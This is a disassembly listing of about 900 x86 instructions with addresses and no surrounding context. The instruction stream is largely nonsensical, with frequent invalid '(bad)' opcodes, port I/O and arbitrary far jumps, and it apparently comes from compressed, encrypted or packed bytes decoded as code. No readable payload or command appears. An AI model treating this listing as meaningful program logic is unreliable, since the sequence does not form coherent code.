  419fc3:	xchg   ecx,eax
  419fc4:	loope  0x419ffc
  419fc6:	dec    esi
  419fc7:	test   al,0xdb
  419fc9:	xor    BYTE PTR gs:[edi+0x3843ec4d],al
  419fd0:	jp     0x419fcb
  419fd2:	out    dx,eax
  419fd3:	ss dec eax
  419fd5:	fsub   QWORD PTR [eax-0x3f]
  419fd8:	sar    BYTE PTR [edx-0x58],cl
  419fdb:	inc    edi
  419fdc:	scas   eax,DWORD PTR es:[edi]
  419fdd:	jo     0x419fbb
  419fdf:	sub    al,0x96
  419fe1:	pop    esp
  419fe2:	inc    esp
  419fe3:	outs   dx,DWORD PTR ds:[esi]
  419fe4:	xchg   BYTE PTR ds:0x9148a5a9,cl
  419fea:	and    DWORD PTR [ebx-0x79],ebp
  419fed:	ja     0x41a05b
  419fef:	bound  edx,QWORD PTR [ecx+0x55c8394a]
  419ff5:	xor    bh,BYTE PTR [ebx]
  419ff7:	retf   
  419ff8:	and    BYTE PTR [ebp+0xbac4226],bh
  419ffe:	xor    edx,edi
  41a000:	push   cs
  41a001:	sub    DWORD PTR [eax+0x37],0x6b06f04
  41a008:	mov    eax,0x38f31f9c
  41a00d:	mov    ah,0x55
  41a00f:	cmp    BYTE PTR [edi+0x30],dh
  41a012:	inc    esi
  41a013:	mov    ah,0xa5
  41a015:	test   al,0xab
  41a017:	fwait
  41a018:	fwait
  41a019:	xor    al,0xb1
  41a01b:	or     al,BYTE PTR [edi+0x2c]
  41a01e:	ss inc ebp
  41a020:	repnz xchg ecx,eax
  41a022:	(bad)  
  41a023:	cwde   
  41a024:	jmp    0x27d6:0xa68e3fd3
  41a02b:	mov    ebp,0x4b53026b
  41a030:	cmp    eax,0xcd328ed3
  41a035:	retf   
  41a036:	or     ah,BYTE PTR [edi+0x71]
  41a039:	in     eax,0x75
  41a03b:	ja     0x41a05a
  41a03d:	xor    DWORD PTR [ebx],ecx
  41a03f:	ins    BYTE PTR es:[edi],dx
  41a040:	xchg   ebp,eax
  41a041:	jno    0x41a0b4
  41a043:	fcomi  st,st(5)
  41a045:	xchg   BYTE PTR [ebx-0x54873c6f],bh
  41a04b:	arpl   WORD PTR [ebp+eax*1-0x53],ax
  41a04f:	fld    DWORD PTR [eax-0x665f9bbc]
  41a055:	dec    esi
  41a056:	pop    ebp
  41a057:	into   
  41a058:	fs mov bh,0x3f
  41a05b:	dec    ebx
  41a05c:	sub    al,0xbb
  41a05e:	jo     0x41a09d
  41a060:	pop    eax
  41a061:	hlt    
  41a062:	sub    BYTE PTR [eax+0x19],bl
  41a065:	int3   
  41a066:	sbb    DWORD PTR [ecx-0x76c0268a],ebp
  41a06c:	loope  0x41a073
  41a06e:	or     esp,DWORD PTR [ebp+0x1]
  41a071:	and    al,0xed
  41a073:	push   ds
  41a074:	out    dx,al
  41a075:	add    esp,DWORD PTR [ecx+0x7397b2eb]
  41a07b:	mov    dl,0x27
  41a07d:	adc    DWORD PTR [edx-0x7e],esp
  41a080:	pop    ecx
  41a081:	mov    ds:0x64c1fb32,al
  41a086:	mov    ecx,0x4d8831fd
  41a08b:	je     0x41a063
  41a08d:	rol    DWORD PTR [esi],1
  41a08f:	inc    ecx
  41a090:	or     DWORD PTR [ebp+0x6fdc2ecb],ebp
  41a096:	mov    cl,0xcc
  41a098:	sbb    BYTE PTR [edx],cl
  41a09a:	mov    dh,0x38
  41a09c:	or     DWORD PTR [esi],edi
  41a09e:	retf   
  41a09f:	jbe    0x41a08e
  41a0a1:	int    0x83
  41a0a3:	sbb    bh,BYTE PTR [edx+esi*2+0x4526b13c]
  41a0aa:	add    esi,DWORD PTR [edx]
  41a0ac:	pop    edx
  41a0ad:	adc    BYTE PTR [ebp-0x60],bl
  41a0b0:	mov    ebp,0x7dcf7ad1
  41a0b5:	xor    DWORD PTR [eax+0x4d91a7b],edx
  41a0bb:	inc    edx
  41a0bc:	push   ecx
  41a0bd:	sub    DWORD PTR [edx],0x770814c6
  41a0c3:	mov    bh,0x8d
  41a0c5:	mov    al,0xcf
  41a0c7:	xor    eax,0xe8c20d49
  41a0cc:	fisttp WORD PTR [ebx-0x43]
  41a0cf:	lahf   
  41a0d0:	add    ebp,DWORD PTR [esp+ebx*2]
  41a0d3:	or     al,0xac
  41a0d5:	scas   al,BYTE PTR es:[edi]
  41a0d6:	lods   eax,DWORD PTR ds:[esi]
  41a0d7:	mov    dl,BYTE PTR [ebx-0x58]
  41a0da:	call   0xf7979eab
  41a0df:	stc    
  41a0e0:	push   es
  41a0e1:	cdq    
  41a0e2:	stos   DWORD PTR es:[edi],eax
  41a0e3:	push   esi
  41a0e4:	mov    eax,ds:0x841128a6
  41a0e9:	jg     0x41a072
  41a0eb:	dec    esp
  41a0ec:	(bad)  
  41a0ed:	mov    ah,0x33
  41a0ef:	cmp    eax,0x17bb2741
  41a0f4:	mov    eax,0xb8d69073
  41a0f9:	mov    edi,DWORD PTR [eax]
  41a0fb:	cdq    
  41a0fc:	shl    DWORD PTR [ebp-0x41],0xa2
  41a100:	adc    dl,BYTE PTR [esi-0x23]
  41a103:	fsubr  DWORD PTR [ebp+0x5d8e9886]
  41a109:	daa    
  41a10a:	lods   eax,DWORD PTR ds:[esi]
  41a10b:	shr    DWORD PTR [ebx-0x6c],0x97
  41a10f:	pop    es
  41a110:	jno    0x41a153
  41a112:	sub    bl,bl
  41a114:	cwde   
  41a115:	test   al,0x83
  41a117:	add    BYTE PTR [edx-0x4b5248bb],0x6a
  41a11e:	lods   eax,DWORD PTR ds:[esi]
  41a11f:	and    DWORD PTR [eax-0x47],ecx
  41a122:	mov    dh,0xde
  41a124:	cmp    DWORD PTR [ebx],ecx
  41a126:	ds pop ebp
  41a128:	cli    
  41a129:	pop    ds
  41a12a:	cwde   
  41a12b:	lahf   
  41a12c:	scas   al,BYTE PTR es:[edi]
  41a12d:	lods   al,BYTE PTR ds:[esi]
  41a12e:	inc    edi
  41a12f:	xchg   esp,eax
  41a130:	push   eax
  41a131:	mov    ds:0xbd564f1b,al
  41a136:	fnstsw WORD PTR [ebp-0x1cd8e55d]
  41a13c:	jb     0x41a14e
  41a13e:	call   0xc02606d5
  41a143:	call   0x44a6688f
  41a148:	repnz sbb al,BYTE PTR [edx+0x13]
  41a14c:	leave  
  41a14d:	or     DWORD PTR [esi],edi
  41a14f:	lahf   
  41a150:	jp     0x41a17d
  41a152:	fwait
  41a153:	pop    es
  41a154:	call   0x5457:0x2b621fc4
  41a15b:	jl     0x41a1a6
  41a15d:	jp     0x41a105
  41a15f:	cmp    ebp,DWORD PTR [esi]
  41a161:	ror    BYTE PTR [esi-0x1b243cab],0x99
  41a168:	sar    DWORD PTR [ebp*1+0x54277897],cl
  41a16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a170:	push   ss
  41a171:	lods   al,BYTE PTR ds:[si]
  41a173:	(bad)  
  41a174:	push   ss
  41a175:	adc    al,ah
  41a177:	ret    0x125f
  41a17a:	xor    BYTE PTR [ebx+0x40],0xf8
  41a17e:	fadd   DWORD PTR [edx+0x3f]
  41a181:	(bad)
  41a186:	pop    ss
  41a187:	das    
  41a188:	test   DWORD PTR [eax],eax
  41a18a:	mov    esp,0x13f2e7cd
  41a18f:	in     eax,0xd4
  41a191:	test   edi,esi
  41a193:	pop    ebx
  41a194:	and    BYTE PTR ds:0x786b1bab,ah
  41a19a:	add    al,0xf9
  41a19c:	xor    eax,0x39a46076
  41a1a1:	sub    DWORD PTR [eax+0xe],ebx
  41a1a4:	adc    BYTE PTR [eax],al
  41a1a6:	pop    ebp
  41a1a7:	retf   
  41a1a8:	add    ah,cl
  41a1aa:	lock inc esp
  41a1ac:	daa    
  41a1ad:	mul    BYTE PTR [esi+ebx*2+0x59f6ea48]
  41a1b4:	xchg   ebp,eax
  41a1b5:	pop    ebx
  41a1b6:	mov    dl,0x65
  41a1b8:	dec    esp
  41a1b9:	stos   BYTE PTR es:[edi],al
  41a1ba:	les    ecx,FWORD PTR [eax-0x78]
  41a1bd:	pop    ebx
  41a1be:	popa   
  41a1bf:	mov    esi,0x742187f0
  41a1c4:	rcl    DWORD PTR [edi-0x5f2a40d],1
  41a1ca:	sbb    BYTE PTR [ebx+0x3b],0x2e
  41a1ce:	mov    ds:0x4cb7a2f5,al
  41a1d3:	mov    dh,0x8b
  41a1d5:	jmp    0xce1bd087
  41a1da:	push   ebx
  41a1db:	in     eax,0x38
  41a1dd:	sub    DWORD PTR [edx+0x1a7fcaf8],eax
  41a1e3:	call   0xc8fda3b5
  41a1e8:	pop    esp
  41a1e9:	in     al,dx
  41a1ea:	cmp    eax,0x9b0da67a
  41a1ef:	cld    
  41a1f0:	shl    DWORD PTR [eax+0x66],0xdb
  41a1f4:	or     al,al
  41a1f6:	movntps XMMWORD PTR ds:0xbeb49213,xmm1
  41a1fd:	push   esi
  41a1fe:	iret   
  41a1ff:	pushf  
  41a200:	mov    ebp,0x17872945
  41a205:	ins    BYTE PTR es:[edi],dx
  41a206:	nop
  41a207:	mov    BYTE PTR [ecx],dh
  41a209:	je     0x41a1a4
  41a20b:	dec    ecx
  41a20c:	loope  0x41a25a
  41a20e:	pop    ecx
  41a20f:	or     eax,ebx
  41a211:	inc    edx
  41a212:	jl     0x41a289
  41a214:	or     al,0x51
  41a216:	sbb    DWORD PTR [esi-0x41],ebx
  41a219:	mov    bh,0x85
  41a21b:	cmp    eax,0x21a4ada0
  41a220:	fucom  st(2)
  41a222:	pop    eax
  41a223:	jae    0x41a232
  41a225:	pop    es
  41a226:	dec    DWORD PTR [ebx-0x80a3580]
  41a22c:	in     eax,dx
  41a22d:	jae    0x41a218
  41a22f:	sbb    eax,0x74
  41a232:	jl     0x41a1d6
  41a234:	jp     0x41a254
  41a236:	add    bl,BYTE PTR ds:0x0
  41a23c:	add    BYTE PTR [eax],al
  41a23e:	add    BYTE PTR [eax],al
  41a240:	add    BYTE PTR [esi-0x105c14ff],ch
  41a246:	jmp    0x41a236
  41a248:	or     eax,0x116c2f8b
  41a24d:	dec    esi
  41a24e:	cmp    eax,DWORD PTR [edi]
  41a250:	push   esp
  41a251:	adc    al,0x20
  41a253:	add    DWORD PTR [eax],eax
  41a255:	scas   eax,DWORD PTR es:[edi]
  41a256:	add    eax,DWORD PTR [eax]
  41a258:	add    BYTE PTR [eax+0x36],bh
  41a25b:	rcr    DWORD PTR [edx],cl
  41a25d:	mov    eax,0x9d61bd3c
  41a262:	repz or bl,BYTE PTR [ebx+ecx*1-0x6246e761]
  41a26a:	sbb    ebx,edi
  41a26c:	das    
  41a26d:	into   
  41a26e:	fisttp QWORD PTR [eax+0x36d4f9c6]
  41a274:	sub    al,0x6
  41a276:	sub    dh,dl
  41a278:	mov    esp,0x99841d89
  41a27d:	lds    ecx,FWORD PTR [esi+0x5036eb3d]
  41a283:	popa   
  41a284:	push   es
  41a285:	dec    esi
  41a286:	sbb    eax,DWORD PTR [esi]
  41a288:	scas   eax,DWORD PTR es:[edi]
  41a289:	adc    eax,0xb10f7bc1
  41a28e:	xchg   DWORD PTR [eax+0x708fd7c7],ebp
  41a294:	and    edx,DWORD PTR [eax]
  41a296:	stc    
  41a297:	push   ds
  41a298:	call   DWORD PTR [edx]
  41a29a:	cmp    ecx,ebp
  41a29c:	shl    BYTE PTR [ebp+0x3a],0xb0
  41a2a0:	(bad)  [edi]
  41a2a2:	call   0xe4d8:0xb194624d
  41a2a9:	add    BYTE PTR gs:[esi+0x51],ah
  41a2ad:	adc    cl,BYTE PTR ds:0x40003a93
  41a2b3:	imul   BYTE PTR [edi-0x1c]
  41a2b6:	fs in  al,dx
  41a2b8:	out    dx,eax
  41a2b9:	call   0xa24b4356
  41a2be:	sbb    ecx,DWORD PTR [eax+0x7a]
  41a2c1:	repnz pushf 
  41a2c3:	ins    BYTE PTR es:[edi],dx
  41a2c4:	rcl    DWORD PTR [eax],cl
  41a2c6:	aas    
  41a2c7:	lahf   
  41a2c8:	jns    0x41a335
  41a2ca:	cmp    eax,0x34872beb
  41a2cf:	push   cs
  41a2d0:	sbb    BYTE PTR [edx+edx*1-0x1145499a],0xeb
  41a2d8:	pop    ecx
  41a2d9:	adc    esi,DWORD PTR [edi]
  41a2db:	jge    0x41a282
  41a2dd:	jnp    0x41a312
  41a2df:	repnz pop esi
  41a2e1:	aas    
  41a2e2:	dec    esp
  41a2e3:	jl     0x41a2f4
  41a2e5:	mov    cl,0x99
  41a2e7:	pop    ebp
  41a2e8:	lods   al,BYTE PTR ds:[esi]
  41a2e9:	int3   
  41a2ea:	jge    0x41a2fd
  41a2ec:	jns    0x41a281
  41a2ee:	rcr    eax,cl
  41a2f0:	xor    al,BYTE PTR [ebx+0x51]
  41a2f3:	in     al,0x32
  41a2f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2f6:	sub    BYTE PTR [eax],dl
  41a2f8:	adc    DWORD PTR [edi+0x3f],edx
  41a2fb:	adc    ah,ch
  41a2fd:	fadd   DWORD PTR [ebx+esi*4+0x17]
  41a301:	mov    edx,0x854afe7a
  41a306:	fwait
  41a307:	mov    esp,0x8cd11ada
  41a30c:	in     al,0x7e
  41a30e:	mov    eax,ds:0xf3a2f2d3
  41a313:	fcmovbe st,st(2)
  41a315:	icebp  
  41a316:	clc    
  41a317:	je     0x41a38b
  41a319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a31a:	into   
  41a31b:	xchg   esi,eax
  41a31c:	loopne 0x41a338
  41a31e:	imul   eax,DWORD PTR [esi+esi*2+0x400b9676],0xffffff89
  41a326:	mov    dl,0x5c
  41a328:	sub    al,BYTE PTR [ebp+ebp*1+0x2d1e7201]
  41a32f:	mov    dl,0x9e
  41a331:	cmp    esi,DWORD PTR ds:0xc7b87757
  41a337:	out    0xb6,al
  41a339:	mov    es,edx
  41a33b:	push   eax
  41a33c:	test   BYTE PTR [esi+esi*1-0x5e95501d],ch
  41a343:	(bad)  
  41a344:	ja     0x41a2fa
  41a346:	jo     0x41a324
  41a348:	inc    esp
  41a349:	stos   DWORD PTR es:[edi],eax
  41a34a:	ds mov esi,0xce3e3ae0
  41a350:	aad    0x5d
  41a352:	movlps QWORD PTR ds:0xf184c7b1,xmm1
  41a359:	int3   
  41a35a:	jp     0x41a30f
  41a35c:	rcr    BYTE PTR [esi],1
  41a35e:	inc    esp
  41a35f:	xor    esp,DWORD PTR [esi-0x23]
  41a362:	gs int 0xa2
  41a365:	push   0x3364c89a
  41a36a:	bound  ebx,QWORD PTR [edx]
  41a36c:	aaa    
  41a36d:	cdq    
  41a36e:	xchg   esp,ebx
  41a370:	add    al,0x1e
  41a372:	in     eax,0x30
  41a374:	mov    WORD PTR [ecx],?
  41a376:	(bad)  
  41a377:	fs jge 0x41a34d
  41a37a:	sbb    eax,0x9c283338
  41a37f:	adc    esp,ebx
  41a381:	adc    edx,DWORD PTR [ebp-0x5e]
  41a384:	pushf  
  41a385:	(bad)  
  41a386:	or     eax,0x14d7350f
  41a38b:	pushf  
  41a38c:	adc    eax,0x8cb2b9f0
  41a391:	xor    al,0xa
  41a393:	test   BYTE PTR [eax+0x31],0x2f
  41a397:	or     al,0x27
  41a399:	xchg   edi,eax
  41a39a:	daa    
  41a39b:	sub    BYTE PTR gs:[ebx+0x5e],al
  41a39f:	xor    eax,0x94507387
  41a3a4:	adc    bl,ch
  41a3a6:	jecxz  0x41a38d
  41a3a8:	aas    
  41a3a9:	je     0x41a405
  41a3ab:	enter  0x3740,0xc5
  41a3af:	cld    
  41a3b0:	(bad)
  41a3b4:	jae    0x41a39d
  41a3b6:	lahf   
  41a3b7:	in     eax,0x46
  41a3b9:	imul   eax,edx,0xffffffd9
  41a3bc:	mov    eax,0xca91e8a7
  41a3c1:	pop    ecx
  41a3c2:	sbb    esi,DWORD PTR [ecx]
  41a3c4:	jmp    0x41a363
  41a3c6:	nop
  41a3c7:	xchg   ebp,eax
  41a3c8:	ins    BYTE PTR es:[edi],dx
  41a3c9:	stc    
  41a3ca:	push   esp
  41a3cb:	jnp    0x41a3f6
  41a3cd:	mov    ds:0x1f532f5c,eax
  41a3d2:	arpl   WORD PTR [ebp+0x5e],bx
  41a3d5:	dec    edi
  41a3d6:	mov    dl,0xfd
  41a3d8:	jno    0x41a438
  41a3da:	mov    esi,0x270a5556
  41a3df:	cmp    al,0xce
  41a3e1:	test   dh,0x67
  41a3e4:	pop    edx
  41a3e5:	loope  0x41a39c
  41a3e7:	jno    0x41a3dc
  41a3e9:	imul   eax,DWORD PTR [eax+esi*8+0x2b],0x48
  41a3ee:	xchg   DWORD PTR [edx],ebp
  41a3f0:	xchg   ecx,eax
  41a3f1:	les    ebp,FWORD PTR [edx+0x5314a9f6]
  41a3f7:	jecxz  0x41a3b2
  41a3f9:	xchg   edx,eax
  41a3fa:	xor    eax,0xb4c01494
  41a3ff:	xchg   BYTE PTR [edx-0x6df8c223],ch
  41a405:	jbe    0x41a405
  41a407:	inc    edi
  41a408:	or     al,0xb7
  41a40a:	xchg   esi,eax
  41a40b:	in     al,dx
  41a40c:	outs   dx,DWORD PTR ds:[esi]
  41a40d:	push   cs
  41a40e:	lods   eax,DWORD PTR ds:[esi]
  41a40f:	and    al,0x8b
  41a411:	cmp    cl,BYTE PTR [eax]
  41a413:	js     0x41a41c
  41a415:	lock test al,0xfc
  41a418:	js     0x41a3a7
  41a41a:	repz add ah,dh
  41a41d:	add    ebx,DWORD PTR [ecx]
  41a41f:	enter  0xb8e7,0xe4
  41a423:	pushf  
  41a424:	or     DWORD PTR [ecx+0x1a],eax
  41a427:	addr16 repnz add al,0xe7
  41a42b:	mov    edx,0xc3ddf919
  41a430:	sub    al,0x79
  41a432:	mov    dl,0xb4
  41a434:	xchg   ebp,eax
  41a435:	cmp    DWORD PTR [eax+edi*8-0x73599f80],ecx
  41a43c:	adc    al,0xc3
  41a43e:	repnz lods eax,DWORD PTR ds:[esi]
  41a440:	jne    0x41a4ac
  41a442:	inc    esi
  41a443:	mov    ds:0x3081b4da,eax
  41a448:	lds    ecx,FWORD PTR [edi]
  41a44a:	xchg   eax,edx
  41a44c:	ja     0x41a410
  41a44e:	jbe    0x41a46d
  41a450:	int3   
  41a451:	mov    esi,DWORD PTR [edi+esi*4-0x1c20c396]
  41a458:	fcomp  QWORD PTR [ebp*1+0x3a6c23d0]
  41a45f:	ins    BYTE PTR es:[edi],dx
  41a460:	idiv   bl
  41a462:	or     bl,ch
  41a464:	cmp    BYTE PTR [edx+0xc4c9900],bl
  41a46a:	xor    eax,0xe37e7116
  41a46f:	add    ch,cl
  41a471:	dec    edi
  41a472:	mov    ch,0x12
  41a474:	inc    ebp
  41a475:	pop    es
  41a476:	lea    esp,[edx+ecx*1+0x2cdc5737]
  41a47d:	cmp    eax,0x291b9591
  41a482:	sbb    DWORD PTR [eax+eax*1],edx
  41a485:	push   esp
  41a486:	fwait
  41a487:	addr16 pushf 
  41a489:	and    al,0xd9
  41a48b:	dec    ebp
  41a48c:	sub    ebp,DWORD PTR [ebx-0x3874a39b]
  41a492:	imul   ebx,DWORD PTR [esi+edx*4+0xff8df5b],0x63
  41a49a:	jle    0x41a4d2
  41a49c:	mov    BYTE PTR [eax+ecx*2-0x6cf71c38],dl
  41a4a3:	xchg   BYTE PTR [ecx+0x53],cl
  41a4a6:	inc    ebp
  41a4a7:	lea    edx,[eiz*8+0x306f7ea1]
  41a4ae:	(bad)  
  41a4af:	js     0x41a4e7
  41a4b1:	mov    ecx,0xb8534b9
  41a4b6:	ins    BYTE PTR es:[edi],dx
  41a4b7:	ins    BYTE PTR es:[edi],dx
  41a4b8:	adc    al,0xe0
  41a4ba:	sar    BYTE PTR [edi-0x2b10661],1
  41a4c0:	cmp    al,0x12
  41a4c2:	out    dx,eax
  41a4c3:	pop    ebx
  41a4c4:	sub    ah,0x94
  41a4c7:	test   al,0xea
  41a4c9:	and    eax,0xf276dc58
  41a4ce:	push   ds
  41a4cf:	cdq    
  41a4d0:	loop   0x41a4a7
  41a4d2:	jnp    0x41a46e
  41a4d4:	(bad)  
  41a4d5:	into   
  41a4d6:	ja     0x41a488
  41a4d8:	out    0xcf,al
  41a4da:	inc    eax
  41a4db:	add    al,0x6f
  41a4dd:	sub    dh,dh
  41a4df:	xor    esi,DWORD PTR [ebx]
  41a4e1:	mov    edx,0xa996e336
  41a4e6:	(bad)  
  41a4e7:	sti    
  41a4e8:	jl     0x41a525
  41a4ea:	xchg   esi,eax
  41a4eb:	mov    esp,ecx
  41a4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ee:	(bad)  [edx]
  41a4f0:	out    0x63,eax
  41a4f2:	xchg   ebx,eax
  41a4f3:	retf   0xac1b
  41a4f6:	pop    eax
  41a4f7:	add    ecx,edx
  41a4f9:	inc    edi
  41a4fa:	and    ecx,DWORD PTR [edi]
  41a4fc:	jnp    0x41a4e9
  41a4fe:	xchg   bl,ah
  41a500:	lods   al,BYTE PTR ds:[esi]
  41a501:	imul   ecx,DWORD PTR [eax+0x44],0x5f3c57a9
  41a508:	rcr    ah,1
  41a50a:	xchg   edi,eax
  41a50b:	cmp    ecx,DWORD PTR [edx+edi*1+0x42001050]
  41a512:	sub    DWORD PTR [eax],esp
  41a514:	jle    0x41a4a0
  41a516:	sbb    bh,BYTE PTR [ebp+0x3e]
  41a519:	loopne 0x41a4d9
  41a51b:	sbb    DWORD PTR [eax-0x25797e9a],eax
  41a521:	icebp  
  41a522:	inc    ecx
  41a523:	mov    cl,0x89
  41a525:	jns    0x41a575
  41a527:	lea    ebp,[ebp+0x112ef8b8]
  41a52d:	imul   esp,DWORD PTR [edi+ebp*4-0x13],0xfcc6a243
  41a535:	jl     0x41a5b0
  41a537:	lock in al,dx
  41a539:	scas   al,BYTE PTR es:[edi]
  41a53a:	or     esi,ecx
  41a53c:	sub    BYTE PTR [edi+0x43],bl
  41a53f:	dec    esi
  41a540:	xor    al,0x7e
  41a542:	jl     0x41a595
  41a544:	sar    BYTE PTR ds:0x9cac5e40,cl
  41a54a:	push   edx
  41a54b:	or     ecx,DWORD PTR [ebp+0x27]
  41a54e:	cmp    bh,ah
  41a550:	xor    BYTE PTR [eax+0x469ac124],dl
  41a556:	lds    eax,FWORD PTR [edx+0x4]
  41a559:	adc    BYTE PTR [esi-0x1d6700c1],bl
  41a55f:	or     al,bh
  41a561:	xchg   esp,eax
  41a562:	mov    WORD PTR [ebx+0x42],es
  41a565:	lods   eax,DWORD PTR ds:[esi]
  41a566:	mov    al,ds:0x9fe3e89b
  41a56b:	cwde   
  41a56c:	sbb    eax,0x93377d0
  41a571:	leave  
  41a572:	not    DWORD PTR [esi+esi*4+0xc]
  41a576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a577:	sub    cl,BYTE PTR [esi]
  41a579:	sbb    ebx,DWORD PTR [edi+edx*2+0x58a411e6]
  41a580:	push   eax
  41a581:	xor    al,0x28
  41a583:	xchg   esi,eax
  41a584:	iret   
  41a585:	fld    TBYTE PTR [eax]
  41a587:	push   es
  41a588:	xchg   ebx,eax
  41a589:	addr16 or eax,edi
  41a58c:	jp     0x41a5e6
  41a58e:	mov    ah,0x11
  41a590:	jae    0x41a58b
  41a592:	inc    edi
  41a593:	pop    esp
  41a594:	lahf   
  41a595:	ss (bad) 
  41a597:	jmp    0x41a610
  41a599:	pusha  
  41a59a:	mov    esp,0x3c7eee24
  41a59f:	repnz leave 
  41a5a1:	dec    eax
  41a5a2:	xchg   edi,eax
  41a5a3:	pop    ds
  41a5a4:	je     0x41a582
  41a5a6:	daa    
  41a5a7:	and    DWORD PTR [edx+0x49da5793],0x2d7c4d68
  41a5b1:	sub    edx,ebp
  41a5b3:	pop    ds
  41a5b4:	or     eax,0xc696e58a
  41a5b9:	cmp    al,0xf8
  41a5bb:	jno    0x41a5f7
  41a5bd:	repz (bad) 
  41a5bf:	int    0x97
  41a5c1:	test   DWORD PTR [ebx-0x7],ebx
  41a5c4:	dec    ebx
  41a5c5:	push   cs
  41a5c6:	loope  0x41a557
  41a5c8:	jp     0x41a5ef
  41a5ca:	inc    edi
  41a5cb:	or     bl,BYTE PTR [edx+0x11]
  41a5ce:	sub    BYTE PTR es:[ecx-0x6],bh
  41a5d2:	pop    edx
  41a5d3:	push   eax
  41a5d4:	fwait
  41a5d5:	add    esi,ecx
  41a5d7:	je     0x41a59c
  41a5d9:	int    0x3e
  41a5db:	jle    0x41a5b2
  41a5dd:	xchg   ebx,eax
  41a5de:	xchg   ebx,eax
  41a5df:	outs   dx,DWORD PTR ds:[esi]
  41a5e0:	stos   BYTE PTR es:[edi],al
  41a5e1:	fs push ecx
  41a5e3:	sbb    DWORD PTR [esi+0x773e381d],edx
  41a5e9:	ret    
  41a5ea:	and    eax,0x18b9ade
  41a5ef:	les    edx,FWORD PTR [eax]
  41a5f1:	pop    ss
  41a5f2:	jp     0x41a59c
  41a5f4:	das    
  41a5f5:	fwait
  41a5f6:	cmp    ah,BYTE PTR [edx+0x6b324362]
  41a5fc:	sub    ecx,ecx
  41a5fe:	fwait
  41a5ff:	cmp    al,dh
  41a601:	not    ch
  41a603:	push   eax
  41a604:	mov    ds:0x9311de,al
	...
  41a611:	aam    0xbf
  41a613:	(bad)  
  41a614:	(bad)  
  41a615:	(bad)  
  41a616:	in     eax,dx
  41a617:	(bad)  
  41a619:	or     al,0x14
  41a61b:	call   0xc38f:0x2fe69e4e
  41a622:	and    eax,DWORD PTR [ecx]
  41a624:	add    BYTE PTR [edi+0x35000003],ch
  41a62a:	stc    
  41a62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a62c:	mov    ds:0x35de6062,al
  41a631:	jge    0x41a5ea
  41a633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a634:	sbb    edi,DWORD PTR [edx+0x7322044c]
  41a63a:	aad    0x96
  41a63c:	inc    ebp
  41a63d:	mov    ebp,0x95fbfff1
  41a642:	sbb    al,0x21
  41a644:	mov    bl,0xd8
  41a646:	fcomp  QWORD PTR [ecx+ecx*8+0x2e]
  41a64a:	adc    al,0x56
  41a64c:	pushf  
  41a64d:	stos   BYTE PTR es:[edi],al
  41a64e:	xchg   edx,eax
  41a64f:	inc    edi
  41a650:	dec    eax
  41a651:	jbe    0x41a630
  41a653:	cs jne 0x41a67c
  41a656:	jmp    0x5a54941
  41a65b:	mov    dl,0x62
  41a65d:	out    0xf2,al
  41a65f:	inc    ebx
  41a660:	mov    dl,0x71
  41a662:	mov    edi,0xdfba4fe4
  41a667:	test   eax,0x5a590efb
  41a66c:	je     0x41a6c1
  41a66e:	inc    esp
  41a66f:	nop
  41a670:	fs not edi
  41a673:	mov    al,0xb0
  41a675:	sub    esp,DWORD PTR [ecx]
  41a677:	inc    edi
  41a678:	cdq    
  41a679:	pop    ecx
  41a67a:	out    dx,al
  41a67b:	jo     0x41a6fa
  41a67d:	xchg   ecx,eax
  41a67e:	retf   0xe673
  41a681:	stc    
  41a682:	ins    DWORD PTR es:[edi],dx
  41a683:	test   eax,0x69d54c6b
  41a688:	push   esi
  41a689:	popa   
  41a68a:	add    eax,0xb3fb8fcf
  41a68f:	jg     0x41a707
  41a691:	xor    DWORD PTR [ebx+0x39],ecx
  41a694:	jl     0x41a67b
  41a696:	push   esi
  41a697:	ror    bh,1
  41a699:	pushf  
  41a69a:	xchg   esi,eax
  41a69b:	ins    DWORD PTR es:[edi],dx
  41a69c:	mov    edx,0xc67ab103
  41a6a1:	mov    ch,BYTE PTR [eax+0x3e]
  41a6a4:	jp     0x41a6ca
  41a6a6:	cmp    al,BYTE PTR [ebx]
  41a6a8:	(bad)  
  41a6a9:	mov    WORD PTR [ebp+edi*2-0x5641852d],ds
  41a6b0:	mov    esi,0x3cf35098
  41a6b5:	mul    DWORD PTR [esi-0x20bb8ead]
  41a6bb:	push   edx
  41a6bc:	mov    al,0xf0
  41a6be:	pop    edx
  41a6bf:	(bad)  
  41a6c0:	ffreep st(7)
  41a6c2:	ret    0xc5ea
  41a6c5:	pop    esp
  41a6c6:	sub    ebx,esi
  41a6c8:	dec    ebx
  41a6c9:	mov    ah,0x34
  41a6cb:	inc    eax
  41a6cc:	sahf   
  41a6cd:	xchg   ebp,eax
  41a6ce:	js     0x41a72a
  41a6d0:	(bad)  
  41a6d1:	sub    bh,BYTE PTR [ecx+0x17]
  41a6d4:	popf   
  41a6d5:	cld    
  41a6d6:	inc    esi
  41a6d7:	(bad)  
  41a6d8:	fiadd  DWORD PTR [ebp+0x34]
  41a6db:	mov    ebp,0x4d8f7c27
  41a6e0:	dec    ebx
  41a6e1:	jo     0x41a73f
  41a6e3:	addr16 js 0x41a751
  41a6e6:	icebp  
  41a6e7:	adc    ch,BYTE PTR [ebp+0x1d709a36]
  41a6ed:	addr16 push edx
  41a6f0:	xchg   esp,eax
  41a6f1:	adc    edi,DWORD PTR [eax]
  41a6f3:	ja     0x41a76d
  41a6f5:	idiv   BYTE PTR fs:[edi-0x6a]
  41a6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6fa:	mov    ecx,DWORD PTR ds:0xdf2d6e6
  41a700:	xchg   esi,eax
  41a701:	cmp    BYTE PTR [edx+0x29],ch
  41a704:	mov    ebx,0x6873fc16
  41a709:	mov    ebx,0xcc909e61
  41a70e:	jns    0x41a6e2
  41a710:	outs   dx,BYTE PTR ds:[esi]
  41a711:	or     ah,ah
  41a713:	(bad)  
  41a714:	mov    al,0x42
  41a716:	(bad)  
  41a717:	lds    edi,FWORD PTR [ecx+0x24]
  41a71a:	les    esp,FWORD PTR [ecx+0x21e9bbf4]
  41a720:	sub    ebx,esp
  41a722:	into   
  41a723:	pushf  
  41a724:	inc    ebp
  41a725:	xchg   ebx,eax
